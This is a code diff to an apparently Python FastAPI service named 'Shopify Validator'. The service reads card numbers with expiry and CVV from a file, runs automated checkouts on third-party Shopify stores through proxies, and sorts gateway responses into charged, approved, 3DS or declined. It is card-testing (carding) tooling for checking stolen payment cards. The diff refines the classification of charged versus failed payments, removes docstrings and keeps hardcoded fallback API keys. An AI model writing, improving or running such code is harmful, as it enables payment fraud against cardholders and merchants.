@@ -526,7 +526,7 @@ async def lifespan(app: FastAPI):
             await res
 
 
-app = FastAPI(title="Shopify Validator", version="4.0.0", lifespan=lifespan)
+app = FastAPI(title="Shopify Validator", version="4.0.1", lifespan=lifespan)
 
 app.add_middleware(
     CORSMiddleware,
@@ -570,7 +570,6 @@ def _get_cards() -> list[dict]:
 
 
 def _parse_card(raw: str) -> Optional[dict]:
-    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv. Returns normalized dict or None."""
     raw = raw.strip()
     if not raw or raw.startswith("#"):
         return None
@@ -751,10 +750,25 @@ def _classify_gateway_text(raw: Optional[str]) -> dict:
 
     msg = raw_str.upper()
 
-    # 1. Charged / Order placed
+    # Guard against payment amount / coverage / unpaid errors being misclassified as charged
+    if any(bad in msg for bad in (
+        "CANNOT COVER", "SUM OF PROPOSED PAYMENTS", "NOT COVER",
+        "UNPAID", "NOT PAID", "PAYMENT_FAILED", "PAYMENT FAILED",
+    )):
+        return {
+            "category": "SITE_ERROR",
+            "code": "PAYMENT_AMOUNT_ERROR",
+            "reason": raw_str,
+            "charged": "False",
+            "approved": "False",
+            "is_3ds": False,
+            "three_ds_reason": "",
+        }
+
+    # 1. Strictly confirmed charged / order placed
     if any(k in msg for k in (
         "ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE",
-        "ORDER_CREATED", "SUBMITSUCCESS", "CHARGED", "PAID",
+        "ORDER_CREATED", "SUBMITSUCCESS", "PAYMENT CHARGED",
     )):
         return {
             "category": "CHARGED",
@@ -766,7 +780,7 @@ def _classify_gateway_text(raw: Optional[str]) -> dict:
             "three_ds_reason": "",
         }
 
-    # 2. 3DS / Authentication required (Approved card path requiring challenge/OTP/SCA)
+    # 2. 3DS / Authentication required
     three_ds_keys = (
         "ACTION_REQUIRED", "ACTIONREQUIRED", "ACTIONREQUIREDRECEIPT",
         "3DS", "OTP", "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
@@ -776,7 +790,11 @@ def _classify_gateway_text(raw: Optional[str]) -> dict:
         "COMPLETEPAYMENTCHALLENGE",
     )
     if any(k in msg for k in three_ds_keys):
-        reason_text = raw_str if raw_str.upper() not in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "3DS_REQUIRED") else f"3D Secure / Authentication triggered ({raw_str})"
+        reason_text = (
+            raw_str
+            if raw_str.upper() not in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "3DS_REQUIRED")
+            else f"3D Secure / Authentication triggered ({raw_str})"
+        )
         return {
             "category": "APPROVED",
             "code": "3DS_REQUIRED",
@@ -787,7 +805,7 @@ def _classify_gateway_text(raw: Optional[str]) -> dict:
             "three_ds_reason": reason_text,
         }
 
-    # 3. Approved / Live card indicators (CVV/AVS/Funds/Issuer rules)
+    # 3. Approved / Live card indicators
     if any(k in msg for k in (
         "INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
         "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
@@ -907,7 +925,6 @@ def _classify_gateway_text(raw: Optional[str]) -> dict:
 
 
 def _parse_gql_errors(errors: list) -> dict:
-    """Extract structured classification from GraphQL errors list."""
     for err in errors:
         for field in (
             "code", "nonLocalizedMessage", "localizedMessage",
@@ -917,11 +934,9 @@ def _parse_gql_errors(errors: list) -> dict:
             if not raw:
                 continue
             info = _classify_gateway_text(raw)
-            if info["category"] in ("CHARGED", "APPROVED"):
+            if info["category"] in ("CHARGED", "APPROVED", "SITE_ERROR"):
                 return info
             upper = raw.upper()
-            if info["category"] == "SITE_ERROR":
-                return info
             if any(k in upper for k in (
                 "PAYMENT_DECLINED", "CARD_DECLINED",
                 "CHARGE_DECLINED", "CARD_WAS_DECLINED",
@@ -972,11 +987,6 @@ async def _fetch_products(
     proxy_str: Optional[str] = None,
     requested_variant_id: Optional[str] = None,
 ) -> tuple[Optional[dict], list[dict], Optional[str]]:
-    """
-    Returns (selected_or_cheapest_product, all_candidates, error_string).
-    If requested_variant_id is given and found in store products, returns that specific variant.
-    Otherwise returns the lowest-priced available product variant.
-    """
     if not base_url.startswith("http"):
         base_url = "https://" + base_url
 
@@ -1130,7 +1140,6 @@ async def _fetch_products(
         matched = next((c for c in candidates if str(c.get("variant_id")) == req_str), None)
         if matched:
             return matched, candidates, None
-        # Even if not in cached list (e.g. headless/custom variant), return a structured variant descriptor
         return {
             "site": base_url,
             "price": cheapest["price"] if cheapest else "0.00",
@@ -1157,17 +1166,6 @@ async def validate_card(
     proxy_str: Optional[str] = None,
     max_price: float = MAX_PRICE,
 ) -> dict:
-    """
-    Full Shopify checkout flow:
-      0. Resolve target product (specific variant_id if provided, else cheapest) & enforce MAX_PRICE
-      1. Add to cart
-      2. Get checkout page -> extract session token & attempt token
-      3. Shipping proposal (GraphQL) & enforce MAX_PRICE
-      4. Delivery proposal (GraphQL) -> pick lowest shipping cost strategy & enforce MAX_PRICE
-      5. Tokenize card (PCI vault)
-      6. Submit mutation (GraphQL)
-      7. Poll receipt (GraphQL, if needed)
-    """
     t0 = time.time()
     gateway = "UNKNOWN"
     price = "0.00"
@@ -1632,7 +1630,6 @@ async def validate_card(
             except (ValueError, TypeError):
                 running_total_f = base_price_f
 
-            # Pick CHEAPEST available delivery strategy to keep shipping cost minimal
             delivery_data = seller.get("delivery") or {}
             delivery_strategy = ""
             shipping_amount = 0.0
@@ -2167,7 +2164,6 @@ async def shopify_route(
     variant_id: Optional[str] = Query(None, description="Optional specific product variant ID"),
     key: Optional[str] = Query(None, description="API Key"),
 ):
-    """Validate/charge a card against a Shopify store checkout (with optional variant_id)."""
     secret = os.environ.get("SHOPII_API_KEY", "GHOSTXOWNER!!!")
     if key != secret:
         return JSONResponse(
@@ -2232,11 +2228,6 @@ async def check_route(
     variant_id: Optional[str] = Query(None, description="Optional specific product variant ID"),
     key: Optional[str] = Query(None, description="API Key"),
 ):
-    """
-    Check a Shopify store (either a specific variant_id or lowest-priced product)
-    within MAX_PRICE and return structured status (CHARGED, APPROVED, CARD_DECLINED,
-    SITE_ERROR, or SITE_SKIPPED).
-    """
     secret = os.environ.get("SHOPII_API_KEY", "DARKANONSHO!!!")
     if key != secret:
         return JSONResponse(
@@ -2337,13 +2328,11 @@ async def health_route():
 
 @app.get("/stats")
 async def stats_route():
-    """Return request statistics."""
     return JSONResponse(dict(_stats))
 
 
 @app.post("/cache/clear")
 async def cache_clear_route():
-    """Clear the product cache."""
     count = len(_product_cache)
     _product_cache.clear()
     return JSONResponse({"cleared": count})
@@ -2351,7 +2340,6 @@ async def cache_clear_route():
 
 @app.post("/reload")
 async def reload_route():
-    """Reload cards from the cards file."""
     _reload_cards()
     return JSONResponse({"cards_loaded": len(_cards_cache)})
 
@@ -2376,7 +2364,7 @@ async def add_timing(request: Request, call_next):
 if __name__ == "__main__":
     print(
         f"\n{'=' * 60}\n"
-        f"  Shopify Validator API  v4.0\n"
+        f"  Shopify Validator API  v4.0.1\n"
         f"  Port:             {PORT}\n"
         f"  Workers:          {WORKERS}\n"
         f"  Pool:             {POOL_SIZE} total / {POOL_PER_HOST} per host\n"
